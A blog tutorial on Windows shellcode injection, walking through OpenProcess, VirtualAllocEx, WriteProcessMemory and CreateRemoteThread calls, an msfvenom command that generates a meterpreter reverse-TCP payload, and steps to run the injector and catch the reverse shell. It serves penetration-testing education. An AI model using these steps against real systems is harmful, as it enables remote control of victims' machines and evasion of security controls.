---
layout: post
title: "Malware Development Part 1: Shellcode Injection"
date: 2025-08-26
categories: [Malware Development,Red Team,Shellcode,C Programming]
image: https://cdn-images-1.medium.com/v2/resize:fit:800/1*jRbFFS4HqKPeyX2b1t4TNg.png
---


First of ALL I want to give special thanks to **Crow** for his guidance and videos. His YouTube channel, [**CRR0WW**](https://www.youtube.com/@crr0ww), is an excellent resource for learning advanced concepts like this.

**Shellcode injection** is a quintessential technique used in malware development and penetration testing to execute arbitrary code within the address space of a **target process**. By leveraging legitimate API functions and low-level system calls, attackers can inject and execute their payload, bypassing various security mechanisms.

This guide provides a practical demonstration of shellcode injection on Windows, complete with code, explanations, and usage tips.

### Prerequisite Knowledge

Before diving into shellcode injection, it’s essential to have a strong foundation in the following areas:

1.  **Windows Internals**: Understanding the fundamental concepts of **processes**, **threads**, **handles**, and **memory management** in Windows is crucial. Study how Windows manages virtual memory, thread execution, and inter-process communication.
2.  **Programming Knowledge**:

*   **C Programming**: Familiarity with pointers, memory allocation, and the Windows API is necessary since most shellcode injection techniques rely heavily on these concepts.
*   **Assembly Language**: Knowing how to read and write basic assembly is highly beneficial. It helps you understand shellcode structure and execution at a low level.

For in-depth learning, consider the following resources:

*   **Books**: _Windows Internals_ by Mark Russinovich and David Solomon is an excellent reference.
*   **Courses**: Explore online tutorials or certifications in Windows Programming and Assembly Language. There is a video on YouTube that explains it well: [https://youtu.be/I\_nJltUokE0?si=cHk4UKQqF41lBIbB](https://youtu.be/I_nJltUokE0?si=cHk4UKQqF41lBIbB)

With this background, you’ll be better equipped to understand and implement shellcode injection techniques effectively.

#### How Shellcode Injection Works

1.  **Open a Handle to the Target Process**

*   The `OpenProcess` function grants access to the target process's memory and threads.

**2\. Allocate Memory in the Target Process**

*   `VirtualAllocEx` allocates a region of memory within the target process to store the shellcode.

**3\. Write Shellcode into Allocated Memory**

*   The `WriteProcessMemory` function writes the shellcode to the allocated memory region.

**4\. Create a Thread to Execute the Shellcode**

*   `CreateRemoteThread` spawns a thread in the target process to execute the shellcode.

**5\. Wait for the Thread to Finish**

*   The program waits for the remote thread to complete execution using `WaitForSingleObject`.

**6\. Clean Up Resources**

*   Handles are closed to prevent resource leaks.

#### The Attack Workflow in Detail

1.  **Process Enumeration**: Identify the PID of the process to be targeted using tools or APIs.
2.  **Open a Handle**: Gain access to the target process with:

> `OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);`

*   **Parameters**:
*   `PROCESS_ALL_ACCESS`: Requests all possible access rights to the process. This allows subsequent memory operations like allocation and writing.
*   `FALSE`: Indicates that the handle cannot be inherited by child processes.
*   `PID`: The Process ID of the target process, which is passed as an argument to the program.
*   **Return Value**:
*   If successful, returns a handle to the process.
*   If it fails, `NULL` is returned, and `GetLastError()` can be used to retrieve the error code.

**3\. Memory Allocation**: Allocate a buffer with appropriate permissions (e.g., `PAGE_EXECUTE_READWRITE`) using:

> `VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);`

*   **Purpose**: Allocates memory in the virtual address space of the target process for the shellcode.
*   **Parameters**:
*   `hProcess`: Handle to the target process obtained via `OpenProcess()`.
*   `NULL`: The starting address for the allocation. `NULL` allows the system to choose the address.
*   `sizeof(shell)`: The size of the memory to be allocated, matching the size of the shellcode.
*   `MEM_COMMIT | MEM_RESERVE`: Flags specifying the memory allocation type:
*   `MEM_COMMIT`: Allocates physical memory.
*   `MEM_RESERVE`: Reserves a range of the process's virtual address space.
*   `PAGE_EXECUTE_READWRITE`: The memory protection attributes for the allocated memory. This makes the memory executable, readable, and writable.
*   **Return Value**:
*   If successful, returns a pointer to the allocated memory in the target process.
*   If it fails, `NULL` is returned.

#### `4. WriteProcessMemory()`

*   **Purpose**: Writes the shellcode into the allocated memory of the target process.

> `WriteProcessMemory(hProcess, rbuffer, shellcode, size, NULL);`

*   **Parameters**:
*   `hProcess`: Handle to the target process.
*   `rbuffer`: The address of the memory block in the target process (returned by `VirtualAllocEx()`).
*   `shell`: The buffer containing the shellcode to be written.
*   `sizeof(shell)`: The number of bytes to write from the shellcode buffer.
*   `NULL`: A pointer to a variable that receives the number of bytes written. Here, it is unused.
*   **Return Value**:
*   If successful, returns a nonzero value.
*   If it fails, returns `0`.

#### `5. CreateRemoteThreadEx()`

*   **Purpose**: Creates a thread in the target process to execute the shellcode.

> `CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rbuffer, NULL, 0, NULL);`

*   **Parameters**:
*   `hProcess`: Handle to the target process.
*   `NULL`: Specifies thread attributes. `NULL` indicates default security attributes.
*   `0`: The size of the stack for the thread. `0` uses the default stack size.
*   `(LPTHREAD_START_ROUTINE)rbuffer`: The starting address of the thread function, which is the shellcode location.
*   `NULL`: Arguments to pass to the thread function, not needed for the shellcode.
*   `0`: Creation flags. `0` starts the thread immediately.
*   `0`: Reserved for future use; set to `0`.
*   `&TID`: A pointer to a variable that receives the thread identifier.
*   **Return Value**:
*   If successful, returns a handle to the newly created thread.
*   If it fails, `NULL` is returned.

#### `6. WaitForSingleObject()`

*   **Purpose**: Waits for the created thread to complete its execution.

> `WaitForSingleObject(hThread, INFINITE);`

*   **Parameters**:
*   `hThread`: Handle to the thread created by `CreateRemoteThreadEx()`.
*   `INFINITE`: Specifies that the function should wait indefinitely for the thread to terminate.
*   **Return Value**:
*   If the wait is successful, the return value indicates the reason the wait was terminated (e.g., thread completion).

#### `7. CloseHandle()`

*   **Purpose**: Closes open handles to the process and thread, freeing associated resources.

> `CloseHandle(hProcess); CloseHandle(hThread);`

*   **Parameters**:
*   `hProcess`: Handle to the target process obtained via `OpenProcess()`.
*   `hThread`: Handle to the created thread obtained via `CreateRemoteThreadEx()`.
*   **Return Value**:
*   If successful, returns `TRUE`.
*   If it fails, return⁣s`FALSE` .

#### Shellcode Execution Steps

1.  **Generate Shellcode**:

*   Using a tool like `msfvenom` to create the payload.
*   Example:
*   `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> exitfunc=thread --platform windows --arch x64 -f c`

**2\. Run the Code**:

*   Pass the target process ID (PID) as an argument to the program.
*   Example:
*   `injector.exe <PID>`

**3\. Start Listener**:

*   On your attacking machine, use a tool like `msfconsole` to start a listener to receive the reverse shell connection.

![](https://cdn-images-1.medium.com/max/600/1*ocV7ScHFhRXMcPPgAv5y0A.png)

![](https://cdn-images-1.medium.com/max/600/1*KDPga6nqzH5nfDHKL6dpJA.png)

#### Full Code Repository

You can find the full code and examples discussed in this article on my **GitHub repository**:  
[**https://github.com/Moataz51201/Shellcode-Injection**](https://github.com/Moataz51201/Shellcode-Injection)

- - -

#### Further Resources: Understanding the Windows API

Shellcode injection relies heavily on the **Win32 API**, a collection of core system calls and libraries that allow interaction with the Windows operating system. If you are new to these functions or want to explore them in more depth, here are some great resources:

**Microsoft’s Official Documentation**:  
[Windows API Reference](https://learn.microsoft.com/en-us/windows/win32/api/): Provides comprehensive details on every function, structure, and constant.

Stay tuned for the next episode.

By [Moataz Osama](https://medium.com/@mezo512) on [November 20, 2024](https://medium.com/p/d6d48b3cb9ec).

[Canonical link](https://medium.com/@mezo512/malware-development-part-1-shellcode-injection-d6d48b3cb9ec)

Exported from [Medium](https://medium.com) on August 26, 2025.